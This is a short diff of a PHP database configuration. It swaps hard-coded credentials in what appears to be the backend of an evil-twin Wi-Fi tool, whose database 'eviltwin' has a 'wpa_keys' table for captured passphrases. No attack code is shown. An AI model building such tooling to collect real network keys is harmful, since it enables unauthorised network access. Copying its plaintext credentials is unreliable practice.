@@ -5,8 +5,8 @@ ob_start();
 //Database Connection Setup!
 
 $host="localhost";
-$username="dodgers"; //root on windows
-$pass="duck"; // "" on windows
+$username="accesspoint"; //root on windows
+$pass="eviltwin"; // "" on windows
 $dbname="eviltwin";
 $tbl_name="wpa_keys";
 
